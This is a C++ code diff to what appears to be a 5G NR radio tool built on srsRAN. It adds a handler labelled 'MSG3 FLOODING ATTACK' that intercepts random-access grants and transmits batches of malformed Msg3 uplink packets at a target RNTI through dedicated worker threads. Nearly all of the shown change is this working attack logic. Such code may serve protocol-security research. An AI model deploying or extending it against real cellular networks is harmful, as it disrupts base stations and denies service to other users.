@@ -16,7 +16,26 @@ Scheduler::Scheduler(ShadowerConfig& config_, Source* source_, Syncer* syncer_, 
                                             std::placeholders::_4);
   /* Attach the handler to apply the configuration from SIB1 */
   broadcast_worker->on_sib1_found = std::bind(&Scheduler::handle_sib1, this, std::placeholders::_1);
+  /* Attach the handler for msg3 attack */
+  broadcast_worker->on_msg3_attack = std::bind(&Scheduler::handle_msg3_attack,
+                                               this,
+                                               std::placeholders::_1,
+                                               std::placeholders::_2,
+                                               std::placeholders::_3);
   broadcast_workers.push_back(broadcast_worker);
+  
+  /* Initialize msg3 generator */
+  msg3_generator = std::make_unique<Msg3Generator>(config);
+  
+  /* Initialize msg3 uplink workers */
+  for (uint32_t i = 0; i < 2; i++) { // Create 2 msg3 ul workers
+    auto worker = std::make_unique<Msg3ULWorker>(logger, source, config);
+    if (!worker->init()) {
+      logger.error("Failed to initialize msg3 UL worker %u", i);
+      continue;
+    }
+    msg3_ul_workers.push_back(std::move(worker));
+  }
 
   /* bind the cell found handler to broadcast worker, when cell is found, apply the configuration to broadcast worker */
   syncer->on_cell_found = std::bind(&Scheduler::handle_mib, this, std::placeholders::_1, std::placeholders::_2);
@@ -157,6 +176,66 @@ void Scheduler::handle_sib1(asn1::rrc_nr::sib1_s& sib1_)
     bc_worker->set_rnti(ra_rnti, srsran_rnti_type_ra);
     logger.info("Activating Broadcast Worker for RA-RNTI[%u]: %u", ra_rnti_idx, ra_rnti);
   }
+}
+
+/* handler for msg3 flooding attack */
+void Scheduler::handle_msg3_attack(uint16_t rnti, std::array<uint8_t, 27UL>& grant, uint32_t slot_idx)
+{
+  logger.warning(YELLOW "*** MSG3 FLOODING ATTACK INITIATED ***" RESET);
+  logger.info("Target RNTI: 0x%x, Slot: %u", rnti, slot_idx);
+  
+  // Generate 100 malformed msg3 packets (10 different types, 10 of each)
+  uint32_t total_packets = 100;
+  uint32_t num_unique = 10; // Generate 10 unique malformed msg3s
+  
+  for (uint32_t batch = 0; batch < (total_packets / num_unique); batch++) {
+    if (!msg3_generator->generate_msg3_packets(rnti, grant, slot_idx, num_unique)) {
+      logger.error("Failed to generate msg3 packets");
+      return;
+    }
+    
+    // Transmit all packets in the queue
+    uint32_t pkt_count = 0;
+    while (msg3_generator->has_msg3_packets()) {
+      auto msg3_pdu = msg3_generator->get_next_msg3();
+      if (!msg3_pdu) {
+        break;
+      }
+      
+      // Create task for msg3 transmission
+      Msg3ULWorker::msg3_ul_task_t task = {};
+      task.rnti                         = msg3_generator->get_rnti();
+      task.rnti_type                    = srsran_rnti_type_ra;
+      task.slot_idx                     = msg3_generator->get_target_slot_idx() + pkt_count; // Spread packets
+      task.rx_tti                       = slot_idx;
+      task.msg3_pdu                     = std::move(msg3_pdu);
+      task.dci_msg                      = msg3_generator->get_grant_info();
+      
+      // Get timestamp from syncer
+      srsran_timestamp_t rx_time;
+      uint32_t           current_slot;
+      syncer->get_tti(&current_slot, &rx_time);
+      task.rx_time = rx_time;
+      
+      // Select a msg3 ul worker and submit task
+      uint32_t worker_idx = pkt_count % msg3_ul_workers.size();
+      if (worker_idx < msg3_ul_workers.size()) {
+        msg3_ul_workers[worker_idx]->set_context(task);
+        // Trigger transmission
+        thread_pool->enqueue([this, worker_idx]() {
+          if (worker_idx < msg3_ul_workers.size()) {
+            msg3_ul_workers[worker_idx]->execute_work();
+          }
+        });
+      }
+      
+      pkt_count++;
+    }
+    
+    logger.info("Batch %u: Transmitted %u msg3 packets", batch + 1, pkt_count);
+  }
+  
+  logger.warning(GREEN "*** MSG3 FLOODING ATTACK COMPLETED: %u packets sent ***" RESET, total_packets);
 }
 
 void Scheduler::run_thread()
